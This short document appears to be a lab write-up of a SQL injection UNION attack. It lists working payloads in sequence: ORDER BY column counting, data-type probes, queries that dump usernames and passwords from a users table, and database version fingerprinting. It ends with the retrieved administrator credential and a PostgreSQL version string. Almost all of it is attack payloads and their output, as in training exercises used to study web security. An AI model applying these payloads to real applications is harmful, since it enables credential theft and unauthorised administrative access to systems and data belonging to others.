SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

First
Determine the number of columns using ORDER BY
' ORDER BY 1--
' ORDER BY 2--
-----
Second :
Determine the data types of the columns
' UNION select 'a',NULL--
' UNION select NULL,a--
----
Third :
Output data from multiple tables
' UNION select NULL, username from users--
' UNION select NULL, password from users--

' UNION select NULL, @@version--  {Microsoft DB}
' UNION select NULL, version()--  {SQL DB}
------
PostgreSQL 12.10 (Ubuntu 12.10-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
------
' UNION select NULL, username || password from users--

administrator 8tfzg5e05mwk3rsbf03v